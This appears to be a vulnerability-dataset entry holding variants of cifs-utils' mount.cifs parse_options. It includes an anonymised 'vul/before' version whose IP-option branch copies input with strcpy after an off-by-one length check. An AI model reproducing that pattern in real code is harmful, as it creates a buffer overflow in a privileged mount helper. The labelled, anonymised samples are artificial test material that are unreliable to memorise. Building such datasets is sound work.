*filesys_flags &= ~MS_NOEXEC;
goto nocopy;
case OPT_GUEST:
parsed_info->got_user = 1;
parsed_info->got_password = 1;
goto nocopy;
case OPT_RO:
*filesys_flags |= MS_RDONLY;
goto nocopy;
case OPT_RW:
*filesys_flags &= ~MS_RDONLY;
goto nocopy;
case OPT_REMOUNT:
*filesys_flags |= MS_REMOUNT;
goto nocopy;
case OPT_IGNORE:
goto nocopy;
case OPT_BKUPUID:
if (!value || !*value)
goto nocopy;
got_bkupuid = 1;
errno = 0;
bkupuid = strtoul(value, &ep, 10);
if (errno == 0 && *ep == '\0')
goto nocopy;
pw = getpwnam(value);
if (pw == NULL) {
fprintf(stderr,
""bad user name \""%s\""\n"", value);
return EX_USAGE;
}
bkupuid = pw->pw_uid;
goto nocopy;
case OPT_BKUPGID:
if (!value || !*value)
goto nocopy;
got_bkupgid = 1;
errno = 0;
bkupgid = strtoul(value, &ep, 10);
if (errno == 0 && *ep == '\0')
goto nocopy;
gr = getgrnam(value);
if (gr == NULL) {
fprintf(stderr,
""bad group name \""%s\""\n"", value);
return EX_USAGE;
}
bkupgid = gr->gr_gid;
goto nocopy;
case OPT_NOFAIL:
parsed_info->nofail = 1;
goto nocopy;
case OPT_SNAPSHOT:
if (!value || !*value)
goto nocopy;
if (strncmp(value, ""@GMT-"", 5))
break;
if ((strlen(value) != GMT_NAME_LEN) ||
(strptime(value, GMT_FORMAT, &tm) == NULL)) {
fprintf(stderr, ""bad snapshot token\n"");
return EX_USAGE;
}
snapshot = timegm(&tm) * 10000000 + NTFS_TIME_OFFSET;
got_snapshot = 1;
goto nocopy;
}
word_len = strlen(data);
if (value)
word_len += 1 + strlen(value);
if (out_len + word_len + 2 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (equals)
*equals = '=';
if (out_len)
strlcat(out, "","", MAX_OPTIONS_LEN);
strlcat(out, data, MAX_OPTIONS_LEN);
out_len = strlen(out);
nocopy:
data = next_keyword;
}
if (got_uid) {
word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", uid);
if (out_len + word_len + 6 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (out_len) {
strlcat(out, "","", MAX_OPTIONS_LEN);
out_len++;
}
snprintf(out + out_len, word_len + 5, ""uid=%s"", txtbuf);
out_len = strlen(out);
}
if (parsed_info->is_krb5 && parsed_info->sudo_uid) {
cruid = parsed_info->sudo_uid;
got_cruid = 1;
}
if (got_cruid) {
word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", cruid);
if (out_len + word_len + 8 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (out_len) {
strlcat(out, "","", MAX_OPTIONS_LEN);
out_len++;
}
snprintf(out + out_len, word_len + 7, ""cruid=%s"", txtbuf);
out_len = strlen(out);
}
if (got_gid) {
word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", gid);
if (out_len + word_len + 6 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (out_len) {
strlcat(out, "","", MAX_OPTIONS_LEN);
out_len++;
}
snprintf(out + out_len, word_len + 5, ""gid=%s"", txtbuf);
out_len = strlen(out);
}
if (got_bkupuid) {
word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", bkupuid);
if (out_len + word_len + 12 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (out_len) {
strlcat(out, "","", MAX_OPTIONS_LEN);
out_len++;
}
snprintf(out + out_len, word_len + 11, ""backupuid=%s"", txtbuf);
out_len = strlen(out);
}
if (got_bkupgid) {
word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", bkupgid);
if (out_len + word_len + 12 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (out_len) {
strlcat(out, "","", MAX_OPTIONS_LEN);
out_len++;
}
snprintf(out + out_len, word_len + 11, ""backupgid=%s"", txtbuf);
out_len = strlen(out);
}
if (got_snapshot) {
word_len = snprintf(txtbuf, sizeof(txtbuf), ""%llu"", snapshot);
if (out_len + word_len + 11 > MAX_OPTIONS_LEN) {
fprintf(stderr, ""Options string too long\n"");
return EX_USAGE;
}
if (out_len) {
strlcat(out, "","", MAX_OPTIONS_LEN);
out_len++;
}
snprintf(out + out_len, word_len + 10, ""snapshot=%s"", txtbuf);
out_len = strlen(out);
}
return 0;
}","static int
parse_options(const char *VAR_0, struct parsed_mount_info *VAR_1)
{
char *VAR_2 = NULL;
char *VAR_3 = NULL;
char *VAR_4 = NULL;
char *VAR_5 = VAR_1->options;
unsigned long *VAR_6 = &VAR_1->flags;
int VAR_7 = 0;
int VAR_8;
int VAR_9 = 0;
int VAR_10 = 0;
int VAR_11 = 0;
int VAR_12 = 0;
int VAR_13 = 0;
int VAR_14 = 0;
int VAR_15 = 0;
uid_t VAR_16, VAR_17 = 0, VAR_18 = 0;
gid_t VAR_19, VAR_20 = 0;
char *VAR_21;
struct passwd *VAR_22;
struct group *VAR_23;
char VAR_24[22];
unsigned long long VAR_25;
struct tm tm;
VAR_5[0] = '\0';
VAR_16 = getuid();
if (VAR_16 != 0)
VAR_12 = 1;
VAR_19 = getgid();
if (VAR_19 != 0)
VAR_14 = 1;
if (!VAR_0)
return VAR_26;
while (VAR_0 && *VAR_0) {
VAR_4 = strchr(VAR_0, ',');
if (VAR_4)
*VAR_4++ = 0;
VAR_2 = NULL;
if ((VAR_3 = strchr(VAR_0, '=')) != NULL) {
*VAR_3 = '\0';
VAR_2 = VAR_3 + 1;
}
switch(parse_opt_token(VAR_0)) {
case VAR_27:
if (!VAR_2 || !*VAR_2) {
*VAR_6 |= VAR_28;
goto nocopy;
}
break;
case VAR_29:
if (!VAR_2 || !*VAR_2) {
if (VAR_0[4] == '\0') {
*VAR_6 |= VAR_30;
goto nocopy;
} else {
fprintf(VAR_31,
""username specified with no parameter\n"");
return VAR_26;
}
} else {
strlcpy(VAR_1->username, VAR_2,
sizeof(VAR_1->username));
VAR_1->got_user = 1;
goto nocopy;
}
case VAR_32:
if (VAR_1->got_password) {
fprintf(VAR_31,
""password specified twice, ignoring second\n"");
goto nocopy;
}
if (!VAR_2 || !*VAR_2) {
VAR_1->got_password = 1;
goto nocopy;
}
VAR_9 = set_password(VAR_1, VAR_2);
if (VAR_9)
return VAR_9;
goto nocopy;
case VAR_33:
if (VAR_2) {
if (!strncmp(VAR_2, ""none"", 4))
VAR_1->got_password = 1;
if (!strncmp(VAR_2, ""krb5"", 4)) {
VAR_1->is_krb5 = 1;
VAR_1->got_password = 1;
}
}
break;
case VAR_34:
if (!VAR_2 || !*VAR_2) {
fprintf(VAR_31,
""target ip address argument missing\n"");
} else if (strnlen(VAR_2, VAR_35) <=
VAR_35) {
strcpy(VAR_1->addrlist, VAR_2);
if (VAR_1->verboseflag)
fprintf(VAR_31,
""ip address %s override specified\n"",
VAR_2);
goto nocopy;
} else {
fprintf(VAR_31, ""ip address too long\n"");
return VAR_26;
}
break;
case VAR_36:
if (!VAR_2 || !*VAR_2) {
fprintf(VAR_31,
""invalid path to network resource\n"");
return VAR_26;
}
VAR_9 = parse_unc(VAR_2, VAR_1, VAR_37);
if (VAR_9)
return VAR_9;
break;
case VAR_38:
if (!VAR_2) {
VAR_1->domain[0] = '\0';
VAR_1->got_domain = 1;
goto nocopy;
}
if (strnlen(VAR_2, sizeof(VAR_1->domain)) >=
sizeof(VAR_1->domain)) {
fprintf(VAR_31, ""domain name too long\n"");
return VAR_26;
}
strlcpy(VAR_1->domain, VAR_2,
sizeof(VAR_1->domain));
goto nocopy;
case VAR_39:
if (!VAR_2 || !*VAR_2) {
fprintf(VAR_31,
""invalid credential file name specified\n"");
return VAR_26;
}
VAR_9 = open_cred_file(VAR_2, VAR_1);
if (VAR_9) {
fprintf(VAR_31,
""error %d (%s) opening credential file %s\n"",
VAR_9, strerror(VAR_9), VAR_2);
return VAR_9;
}
goto nocopy;
case VAR_40:
if (!VAR_2 || !*VAR_2)
goto nocopy;
VAR_12 = 1;
VAR_22 = getpwnam(VAR_2);
if (VAR_22) {
VAR_16 = VAR_22->pw_uid;
goto nocopy;
}
VAR_41 = 0;
VAR_16 = strtoul(VAR_2, &VAR_21, 10);
if (VAR_41 == 0 && *VAR_21 == '\0')
goto nocopy;
fprintf(VAR_31, ""bad option uid=\""%s\""\n"", VAR_2);
return VAR_26;
case VAR_42:
if (!VAR_2 || !*VAR_2)
goto nocopy;
VAR_13 = 1;
VAR_22 = getpwnam(VAR_2);
if (VAR_22) {
VAR_17 = VAR_22->pw_uid;
goto nocopy;
}
VAR_41 = 0;
VAR_17 = strtoul(VAR_2, &VAR_21, 10);
if (VAR_41 == 0 && *VAR_21 == '\0')
goto nocopy;
fprintf(VAR_31, ""bad option: cruid=\""%s\""\n"", VAR_2);
return VAR_26;
case VAR_43:
if (!VAR_2 || !*VAR_2)
goto nocopy;
VAR_14 = 1;
VAR_23 = getgrnam(VAR_2);
if (VAR_23) {
VAR_19 = VAR_23->gr_gid;
goto nocopy;
}
VAR_41 = 0;
VAR_19 = strtoul(VAR_2, &VAR_21, 10);
if (VAR_41 == 0 && *VAR_21 == '\0')
goto nocopy;
fprintf(VAR_31, ""bad option: gid=\""%s\""\n"", VAR_2);
return VAR_26;
case VAR_44:
fprintf(VAR_31,
""WARNING: CIFS mount option 'fmask' is\
deprecated. Use 'file_mode' instead.\n"");
VAR_0 = ""file_mode"";
case VAR_45:
if (!VAR_2 || !*VAR_2) {
fprintf(VAR_31,
""Option '%s' requires a numerical argument\n"",
VAR_0);
return VAR_26;
}
if (VAR_2[0] != '0')
fprintf(VAR_31,
""WARNING: '%s' not expressed in octal.\n"",
VAR_0);
break;
case VAR_46:
fprintf(VAR_31,
""WARNING: CIFS mount option 'dmask' is\
deprecated. Use 'dir_mode' instead.\n"");
VAR_0 = ""dir_mode"";
case VAR_47:
if (!VAR_2 || !*VAR_2) {
fprintf(VAR_31,
""Option '%s' requires a numerical argument\n"",
VAR_0);
return VAR_26;
}
if (VAR_2[0] != '0')
fprintf(VAR_31,
""WARNING: '%s' not expressed in octal.\n"",
VAR_0);
break;
case VAR_48:
*VAR_6 |= VAR_49;
goto nocopy;
case VAR_50:
*VAR_6 &= ~VAR_49;
goto nocopy;
case VAR_51:
*VAR_6 |= VAR_52;
goto nocopy;
case VAR_53:
*VAR_6 &= ~VAR_54;
break;
case VAR_55:
*VAR_6 |= VAR_54;
goto nocopy;
case VAR_56:
*VAR_6 &= ~VAR_54;
goto nocopy;
case VAR_57:
*VAR_6 &= ~VAR_52;
goto nocopy;
case VAR_58:
*VAR_6 |= VAR_59;
goto nocopy;
case VAR_60:
*VAR_6 &= ~VAR_59;
goto nocopy;
case VAR_61:
VAR_1->got_user = 1;
VAR_1->got_password = 1;
goto nocopy;
case VAR_62:
*VAR_6 |= VAR_63;
goto nocopy;
case VAR_64:
*VAR_6 &= ~VAR_63;
goto nocopy;
case VAR_65:
*VAR_6 |= VAR_66;
goto nocopy;
case VAR_67:
goto nocopy;
case VAR_68:
if (!VAR_2 || !*VAR_2)
goto nocopy;
VAR_10 = 1;
VAR_41 = 0;
VAR_18 = strtoul(VAR_2, &VAR_21, 10);
if (VAR_41 == 0 && *VAR_21 == '\0')
goto nocopy;
VAR_22 = getpwnam(VAR_2);
if (VAR_22 == NULL) {
fprintf(VAR_31,
""bad user name \""%s\""\n"", VAR_2);
return VAR_26;
}
VAR_18 = VAR_22->pw_uid;
goto nocopy;
case VAR_69:
if (!VAR_2 || !*VAR_2)
goto nocopy;
VAR_11 = 1;
VAR_41 = 0;
VAR_20 = strtoul(VAR_2, &VAR_21, 10);
if (VAR_41 == 0 && *VAR_21 == '\0')
goto nocopy;
VAR_23 = getgrnam(VAR_2);
if (VAR_23 == NULL) {
fprintf(VAR_31,
""bad group name \""%s\""\n"", VAR_2);
return VAR_26;
}
VAR_20 = VAR_23->gr_gid;
goto nocopy;
case VAR_70:
VAR_1->nofail = 1;
goto nocopy;
case VAR_71:
if (!VAR_2 || !*VAR_2)
goto nocopy;
if (strncmp(VAR_2, ""@GMT-"", 5))
break;
if ((strlen(VAR_2) != VAR_72) ||
(strptime(VAR_2, VAR_73, &tm) == NULL)) {
fprintf(VAR_31, ""bad snapshot token\n"");
return VAR_26;
}
VAR_25 = timegm(&tm) * 10000000 + VAR_74;
VAR_15 = 1;
goto nocopy;
}
VAR_8 = strlen(VAR_0);
if (VAR_2)
VAR_8 += 1 + strlen(VAR_2);
if (VAR_7 + VAR_8 + 2 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_3)
*VAR_3 = '=';
if (VAR_7)
strlcat(VAR_5, "","", VAR_75);
strlcat(VAR_5, VAR_0, VAR_75);
VAR_7 = strlen(VAR_5);
nocopy:
VAR_0 = VAR_4;
}
if (VAR_12) {
VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_16);
if (VAR_7 + VAR_8 + 6 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_7) {
strlcat(VAR_5, "","", VAR_75);
VAR_7++;
}
snprintf(VAR_5 + VAR_7, VAR_8 + 5, ""uid=%s"", VAR_24);
VAR_7 = strlen(VAR_5);
}
if (VAR_1->is_krb5 && VAR_1->sudo_uid) {
VAR_17 = VAR_1->sudo_uid;
VAR_13 = 1;
}
if (VAR_13) {
VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_17);
if (VAR_7 + VAR_8 + 8 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_7) {
strlcat(VAR_5, "","", VAR_75);
VAR_7++;
}
snprintf(VAR_5 + VAR_7, VAR_8 + 7, ""cruid=%s"", VAR_24);
VAR_7 = strlen(VAR_5);
}
if (VAR_14) {
VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_19);
if (VAR_7 + VAR_8 + 6 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_7) {
strlcat(VAR_5, "","", VAR_75);
VAR_7++;
}
snprintf(VAR_5 + VAR_7, VAR_8 + 5, ""gid=%s"", VAR_24);
VAR_7 = strlen(VAR_5);
}
if (VAR_10) {
VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_18);
if (VAR_7 + VAR_8 + 12 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_7) {
strlcat(VAR_5, "","", VAR_75);
VAR_7++;
}
snprintf(VAR_5 + VAR_7, VAR_8 + 11, ""backupuid=%s"", VAR_24);
VAR_7 = strlen(VAR_5);
}
if (VAR_11) {
VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%u"", VAR_20);
if (VAR_7 + VAR_8 + 12 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_7) {
strlcat(VAR_5, "","", VAR_75);
VAR_7++;
}
snprintf(VAR_5 + VAR_7, VAR_8 + 11, ""backupgid=%s"", VAR_24);
VAR_7 = strlen(VAR_5);
}
if (VAR_15) {
VAR_8 = snprintf(VAR_24, sizeof(VAR_24), ""%llu"", VAR_25);
if (VAR_7 + VAR_8 + 11 > VAR_75) {
fprintf(VAR_31, ""Options string too long\n"");
return VAR_26;
}
if (VAR_7) {
strlcat(VAR_5, "","", VAR_75);
VAR_7++;
}
snprintf(VAR_5 + VAR_7, VAR_8 + 10, ""snapshot=%s"", VAR_24);
VAR_7 = strlen(VAR_5);
}
return 0;
}",piastry/cifs-utils/955fb147e97a6a74e1aaa65766de91e2c1479765/mount.cifs.c/vul/before/0.json,"static int
parse_options(const char *data, struct parsed_mount_info *parsed_info)
{
	char *value = NULL;
	char *equals = NULL;
	char *next_keyword = NULL;
	char *out = parsed_info->options;
	unsigned long *filesys_flags = &parsed_info->flags;
	int out_len = 0;
	int word_len;
	int rc = 0;
	int got_bkupuid = 0;
	int got_bkupgid = 0;
	int got_uid = 0;
	int got_cruid = 0;
	int got_gid = 0;
	int got_snapshot = 0;
	uid_t uid, cruid = 0, bkupuid = 0;
	gid_t gid, bkupgid = 0;
	char *ep;
	struct passwd *pw;
	struct group *gr;
	/*
	 * max 64-bit uint in decimal is 18446744073709551615 which is 20 chars
	 * wide +1 for NULL, and +1 for good measure
	 */
	char txtbuf[22];
	unsigned long long snapshot;
	struct tm tm;

	/* make sure we're starting from beginning */
	out[0] = '\0';

	/* BB fixme check for separator override BB */
	uid = getuid();
	if (uid != 0)
		got_uid = 1;

	gid = getgid();
	if (gid != 0)
		got_gid = 1;

	if (!data)
		return EX_USAGE;

	/*
	 * format is keyword,keyword2=value2,keyword3=value3... 
	 * data  = next keyword
	 * value = next value ie stuff after equal sign
	 */
	while (data && *data) {
		next_keyword = strchr(data, ',');	/* BB handle sep= */

		/* temporarily null terminate end of keyword=value pair */
		if (next_keyword)
			*next_keyword++ = 0;

		/* temporarily null terminate keyword if there's a value */
		value = NULL;
		if ((equals = strchr(data, '=')) != NULL) {
			*equals = '\0';
			value = equals + 1;
		}

		switch(parse_opt_token(data)) {
		case OPT_USERS:
			if (!value || !*value) {
				*filesys_flags |= MS_USERS;
				goto nocopy;
			}
			break;

		case OPT_USER:
			if (!value || !*value) {
				if (data[4] == '\0') {
					*filesys_flags |= MS_USER;
					goto nocopy;
				} else {
					fprintf(stderr,
						""username specified with no parameter\n"");
					return EX_USAGE;
				}
			} else {
				strlcpy(parsed_info->username, value,
					sizeof(parsed_info->username));
				parsed_info->got_user = 1;
				goto nocopy;
			}

		case OPT_PASS:
			if (parsed_info->got_password) {
				fprintf(stderr,
					""password specified twice, ignoring second\n"");
				goto nocopy;
			}
			if (!value || !*value) {
				parsed_info->got_password = 1;
				goto nocopy;
			}
			rc = set_password(parsed_info, value);
			if (rc)
				return rc;
			goto nocopy;

		case OPT_SEC:
			if (value) {
				if (!strncmp(value, ""none"", 4))
					parsed_info->got_password = 1;
				if (!strncmp(value, ""krb5"", 4)) {
					parsed_info->is_krb5 = 1;
					parsed_info->got_password = 1;
				}
			}
			break;

		case OPT_IP:
			if (!value || !*value) {
				fprintf(stderr,
					""target ip address argument missing\n"");
			} else if (strnlen(value, MAX_ADDRESS_LEN) <
				MAX_ADDRESS_LEN) {
				strlcpy(parsed_info->addrlist, value,
					MAX_ADDRESS_LEN);
				if (parsed_info->verboseflag)
					fprintf(stderr,
						""ip address %s override specified\n"",
						value);
				goto nocopy;
			} else {
				fprintf(stderr, ""ip address too long\n"");
				return EX_USAGE;

			}
			break;

		/* unc || target || path */
		case OPT_UNC:
			if (!value || !*value) {
				fprintf(stderr,
					""invalid path to network resource\n"");
				return EX_USAGE;
			}
			rc = parse_unc(value, parsed_info, thisprogram);
			if (rc)
				return rc;
			break;

		/* dom || workgroup */
		case OPT_DOM:
			if (!value) {
				/*
				 * An empty domain has been passed
				 */
				/* not necessary but better safe than.. */
				parsed_info->domain[0] = '\0';
				parsed_info->got_domain = 1;
				goto nocopy;
			}
			if (strnlen(value, sizeof(parsed_info->domain)) >=
			    sizeof(parsed_info->domain)) {
				fprintf(stderr, ""domain name too long\n"");
				return EX_USAGE;
			}
			strlcpy(parsed_info->domain, value,
				sizeof(parsed_info->domain));
			goto nocopy;

		case OPT_CRED:
			if (!value || !*value) {
				fprintf(stderr,
					""invalid credential file name specified\n"");
				return EX_USAGE;
			}
			rc = open_cred_file(value, parsed_info);
			if (rc) {
				fprintf(stderr,
					""error %d (%s) opening credential file %s\n"",
					rc, strerror(rc), value);
				return rc;
			}
			goto nocopy;

		case OPT_UID:
			if (!value || !*value)
				goto nocopy;

			got_uid = 1;
			pw = getpwnam(value);
			if (pw) {
				uid = pw->pw_uid;
				goto nocopy;
			}

			errno = 0;
			uid = strtoul(value, &ep, 10);
			if (errno == 0 && *ep == '\0')
				goto nocopy;

			fprintf(stderr, ""bad option uid=\""%s\""\n"", value);
			return EX_USAGE;
		case OPT_CRUID:
			if (!value || !*value)
				goto nocopy;

			got_cruid = 1;
			pw = getpwnam(value);
			if (pw) {
				cruid = pw->pw_uid;
				goto nocopy;
			}

			errno = 0;
			cruid = strtoul(value, &ep, 10);
			if (errno == 0 && *ep == '\0')
				goto nocopy;

			fprintf(stderr, ""bad option: cruid=\""%s\""\n"", value);
			return EX_USAGE;
		case OPT_GID:
			if (!value || !*value)
				goto nocopy;

			got_gid = 1;
			gr = getgrnam(value);
			if (gr) {
				gid = gr->gr_gid;
				goto nocopy;
			}

			errno = 0;
			gid = strtoul(value, &ep, 10);
			if (errno == 0 && *ep == '\0')
				goto nocopy;

			fprintf(stderr, ""bad option: gid=\""%s\""\n"", value);
			return EX_USAGE;
		/* fmask falls through to file_mode */
		case OPT_FMASK:
			fprintf(stderr,
				""WARNING: CIFS mount option 'fmask' is\
				 deprecated. Use 'file_mode' instead.\n"");
			data = ""file_mode"";	/* BB fix this */
			/* Fallthrough */
		case OPT_FILE_MODE:
			if (!value || !*value) {
				fprintf(stderr,
					""Option '%s' requires a numerical argument\n"",
					data);
				return EX_USAGE;
			}

			if (value[0] != '0')
				fprintf(stderr,
					""WARNING: '%s' not expressed in octal.\n"",
					data);
			break;

		/* dmask falls through to dir_mode */
		case OPT_DMASK:
			fprintf(stderr,
				""WARNING: CIFS mount option 'dmask' is\
				 deprecated. Use 'dir_mode' instead.\n"");
			data = ""dir_mode"";
			/* Fallthrough */
		case OPT_DIR_MODE:
			if (!value || !*value) {
				fprintf(stderr,
					""Option '%s' requires a numerical argument\n"",
					data);
				return EX_USAGE;
			}

			if (value[0] != '0')
				fprintf(stderr,
					""WARNING: '%s' not expressed in octal.\n"",
					data);
			break;
		case OPT_NO_SUID:
			*filesys_flags |= MS_NOSUID;
			goto nocopy;
		case OPT_SUID:
			*filesys_flags &= ~MS_NOSUID;
			goto nocopy;
		case OPT_NO_DEV:
			*filesys_flags |= MS_NODEV;
			goto nocopy;
		case OPT_NO_LOCK:
			*filesys_flags &= ~MS_MANDLOCK;
			break;
		case OPT_MAND:
			*filesys_flags |= MS_MANDLOCK;
			goto nocopy;
		case OPT_NOMAND:
			*filesys_flags &= ~MS_MANDLOCK;
			goto nocopy;
		case OPT_DEV:
			*filesys_flags &= ~MS_NODEV;
			goto nocopy;
		case OPT_NO_EXEC:
			*filesys_flags |= MS_NOEXEC;
			goto nocopy;
		case OPT_EXEC:
			*filesys_flags &= ~MS_NOEXEC;
			goto nocopy;
		case OPT_GUEST:
			parsed_info->got_user = 1;
			parsed_info->got_password = 1;
			goto nocopy;
		case OPT_RO:
			*filesys_flags |= MS_RDONLY;
			goto nocopy;
		case OPT_RW:
			*filesys_flags &= ~MS_RDONLY;
			goto nocopy;
		case OPT_REMOUNT:
			*filesys_flags |= MS_REMOUNT;
			goto nocopy;
		case OPT_IGNORE:
			goto nocopy;
		case OPT_BKUPUID:
			if (!value || !*value)
				goto nocopy;

			got_bkupuid = 1;
			errno = 0;
			bkupuid = strtoul(value, &ep, 10);
			if (errno == 0 && *ep == '\0')
				goto nocopy;

			pw = getpwnam(value);
			if (pw == NULL) {
				fprintf(stderr,
					""bad user name \""%s\""\n"", value);
				return EX_USAGE;
			}

			bkupuid = pw->pw_uid;
			goto nocopy;
		case OPT_BKUPGID:
			if (!value || !*value)
				goto nocopy;

			got_bkupgid = 1;
			errno = 0;
			bkupgid = strtoul(value, &ep, 10);
			if (errno == 0 && *ep == '\0')
				goto nocopy;

			gr = getgrnam(value);
			if (gr == NULL) {
				fprintf(stderr,
					""bad group name \""%s\""\n"", value);
				return EX_USAGE;
			}

			bkupgid = gr->gr_gid;
			goto nocopy;
		case OPT_NOFAIL:
			parsed_info->nofail = 1;
			goto nocopy;
		case OPT_SNAPSHOT:
			if (!value || !*value)
				goto nocopy;
			if (strncmp(value, ""@GMT-"", 5))
				break;
			if ((strlen(value) != GMT_NAME_LEN) ||
			    (strptime(value, GMT_FORMAT, &tm) == NULL)) {
				fprintf(stderr, ""bad snapshot token\n"");
				return EX_USAGE;
			}
			snapshot = timegm(&tm) * 10000000 + NTFS_TIME_OFFSET;
			got_snapshot = 1;
			goto nocopy;
		}

		/* check size before copying option to buffer */
		word_len = strlen(data);
		if (value)
			word_len += 1 + strlen(value);

		/* need 2 extra bytes for comma and null byte */
		if (out_len + word_len + 2 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		/* put back equals sign, if any */
		if (equals)
			*equals = '=';

		/* go ahead and copy */
		if (out_len)
			strlcat(out, "","", MAX_OPTIONS_LEN);

		strlcat(out, data, MAX_OPTIONS_LEN);
		out_len = strlen(out);
nocopy:
		data = next_keyword;
	}


	/* special-case the uid and gid */
	if (got_uid) {
		word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", uid);

		/* comma + ""uid="" + terminating NULL == 6 */
		if (out_len + word_len + 6 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		if (out_len) {
			strlcat(out, "","", MAX_OPTIONS_LEN);
			out_len++;
		}
		snprintf(out + out_len, word_len + 5, ""uid=%s"", txtbuf);
		out_len = strlen(out);
	}
	if (parsed_info->is_krb5 && parsed_info->sudo_uid) {
		cruid = parsed_info->sudo_uid;
		got_cruid = 1;
	}
	if (got_cruid) {
		word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", cruid);

		/* comma + ""cruid="" + terminating NULL == 8 */
		if (out_len + word_len + 8 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		if (out_len) {
			strlcat(out, "","", MAX_OPTIONS_LEN);
			out_len++;
		}
		snprintf(out + out_len, word_len + 7, ""cruid=%s"", txtbuf);
		out_len = strlen(out);
	}
	if (got_gid) {
		word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", gid);

		/* comma + ""gid="" + terminating NULL == 6 */
		if (out_len + word_len + 6 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		if (out_len) {
			strlcat(out, "","", MAX_OPTIONS_LEN);
			out_len++;
		}
		snprintf(out + out_len, word_len + 5, ""gid=%s"", txtbuf);
		out_len = strlen(out);
	}
	if (got_bkupuid) {
		word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", bkupuid);

		/* comma + ""backupuid="" + terminating NULL == 12 */
		if (out_len + word_len + 12 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		if (out_len) {
			strlcat(out, "","", MAX_OPTIONS_LEN);
			out_len++;
		}
		snprintf(out + out_len, word_len + 11, ""backupuid=%s"", txtbuf);
		out_len = strlen(out);
	}
	if (got_bkupgid) {
		word_len = snprintf(txtbuf, sizeof(txtbuf), ""%u"", bkupgid);

		/* comma + ""backupgid="" + terminating NULL == 12 */
		if (out_len + word_len + 12 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		if (out_len) {
			strlcat(out, "","", MAX_OPTIONS_LEN);
			out_len++;
		}
		snprintf(out + out_len, word_len + 11, ""backupgid=%s"", txtbuf);
		out_len = strlen(out);
	}
	if (got_snapshot) {
		word_len = snprintf(txtbuf, sizeof(txtbuf), ""%llu"", snapshot);

		/* comma + ""snapshot="" + terminating NULL == 11 */
		if (out_len + word_len + 11 > MAX_OPTIONS_LEN) {
			fprintf(stderr, ""Options string too long\n"");
			return EX_USAGE;
		}

		if (out_len) {
			strlcat(out, "","", MAX_OPTIONS_LEN);
			out_len++;
		}
		snprintf(out + out_len, word_len + 10, ""snapshot=%s"", txtbuf);
		out_len = strlen(out);
	}

	return 0;
}","static int
parse_options(const char *VAR_0, struct parsed_mount_info *VAR_1)
{
	char *VAR_2 = NULL;
	char *VAR_3 = NULL;
	char *VAR_4 = NULL;
	char *VAR_5 = VAR_1->options;
	unsigned long *VAR_6 = &VAR_1->flags;
	int VAR_7 = 0;
	int VAR_8;
	int VAR_9 = 0;
	int VAR_10 = 0;
	int VAR_11 = 0;
	int VAR_12 = 0;
	int VAR_13 = 0;
	int VAR_14 = 0;
	int VAR_15 = 0;
	uid_t VAR_16, VAR_17 = 0, VAR_18 = 0;
	gid_t VAR_19, VAR_20 = 0;
	char *VAR_21;
	struct passwd *VAR_22;
	struct group *VAR_23;
	/* COMMENT_0 */
                                                                        
                                             
    
	char VAR_24[22];
	unsigned long long VAR_25;
	struct tm tm;

	/* COMMENT_4 */
	VAR_5[0] = '\0';

	/* COMMENT_5 */
	VAR_16 = getuid();
	if (VAR_16 != 0)
		VAR_12 = 1;

	VAR_19 = getgid();
	if (VAR_19 != 0)
		VAR_14 = 1;

	if (!VAR_0)
		return VAR_26;

	/* COMMENT_6 */
                                                         
                        
                                                
    
	while (VAR_0 && *VAR_0) {
		VAR_4 = strchr(VAR_0, ',');	/* COMMENT_11 */

		/* COMMENT_12 */
		if (VAR_4)
			*VAR_4++ = 0;

		/* COMMENT_13 */
		VAR_2 = NULL;
		if ((VAR_3 = strchr(VAR_0, '=')) != NULL) {
			*VAR_3 = '\0';
			VAR_2 = VAR_3 + 1;
		}

		switch(parse_opt_token(VAR_0)) {
		case VAR_27:
			if (!VAR_2 || !*VAR_2) {
				*VAR_6 |= VAR_28;
				goto nocopy;
			}
			break;

		case VAR_29:
			if (!VAR_2 || !*VAR_2) {
				if (VAR_0[4] == '\0') {
					*VAR_6 |= VAR_30;
					goto nocopy;
				} else {
					fprintf(VAR_31,
